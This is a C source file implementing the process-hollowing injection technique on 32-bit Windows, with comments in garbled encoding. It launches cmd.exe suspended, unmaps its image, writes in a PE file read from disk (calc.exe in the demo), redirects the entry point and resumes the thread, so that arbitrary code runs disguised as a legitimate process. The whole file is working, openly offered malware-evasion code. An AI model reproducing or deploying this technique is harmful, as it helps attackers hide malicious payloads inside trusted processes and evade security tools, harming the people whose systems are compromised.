#include "header.h"

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

BOOL hollowing(char path[]) {

	PVOID FileBuffer;
	HANDLE hFile;
	DWORD FileReadSize;
	DWORD dwFileSize;

	PVOID RemoteImageBase;			//peb�п�ִ��ӳ��Ļ�ַ
	PVOID RemoteProcessMemory;		//�οս����з�����ڴ�ռ�

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };			//���̾���޸��ڴ�ռ�
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	si.cb = sizeof(si);
	//����һ������Ľ���
	BOOL bRet = CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

	//�������������ڴ�ռ�
	hFile = CreateFileA(path, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	dwFileSize = GetFileSize(hFile, NULL);
	FileBuffer = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//�������ļ���ȡ��������ڴ�ռ�
	ReadFile(hFile, FileBuffer, dwFileSize, &FileReadSize, NULL);
	CloseHandle(hFile);

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)FileBuffer;
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((LPBYTE)FileBuffer + pDosHeader->e_lfanew);
	PIMAGE_FILE_HEADER pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNtHeader) + 4);
	PIMAGE_OPTIONAL_HEADER32 pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER);
	PIMAGE_SECTION_HEADER pSectionHeader;

	//��ȡ������̵��߳�������
	GetThreadContext(pi.hThread, &ctx);

	//x86������ebx�Ĵ����л�ȡpeb��ַ������peb��Ŀ����̵Ļ�ַ(ƫ��8���ֽ�)��RemoteImageBase
	//��ѡͷ�е�imagebase
	ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &RemoteImageBase, sizeof(PVOID), NULL);

	//�ж��ļ�Ԥ�ڼ��ص�ַ�Ƿ�ռ��
	pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
	//�ڿ��Ѽ��صĵ�ַ
	if ((SIZE_T)RemoteImageBase == pNtHeader->OptionalHeader.ImageBase)
		NtUnmapViewOfSection(pi.hProcess, RemoteImageBase);

	//Ϊ��ִ��ӳ��������ڴ棬��д���ļ�ͷ
	RemoteProcessMemory = VirtualAllocEx(pi.hProcess, (PVOID)pOptionHeader->ImageBase, pOptionHeader->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(pi.hProcess, RemoteProcessMemory, FileBuffer, pOptionHeader->SizeOfHeaders, NULL);

	//���д��
	for (int i = 0; i < pPEHeader->NumberOfSections; i++)
	{
		pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)FileBuffer + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + i * sizeof(IMAGE_SECTION_HEADER));
		WriteProcessMemory(pi.hProcess, (PVOID)((LPBYTE)RemoteProcessMemory + pSectionHeader->VirtualAddress), (PVOID)((LPBYTE)FileBuffer + pSectionHeader->PointerToRawData), pSectionHeader->SizeOfRawData, NULL);
	}

	//���ĳ�����ڵ�
	ctx.Eax = (SIZE_T)((LPBYTE)RemoteProcessMemory + pOptionHeader->AddressOfEntryPoint);
	WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &pOptionHeader->ImageBase, sizeof(PVOID), NULL);

	//�����߳�������
	SetThreadContext(pi.hThread, &ctx);
	//�ָ������߳�
	ResumeThread(pi.hThread);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	return TRUE;
}

int main(int argc, char* argv[]) {
	char path[] = "C:\\windows\\syswow64\\calc.exe";
	hollowing(path);
	return 0;
}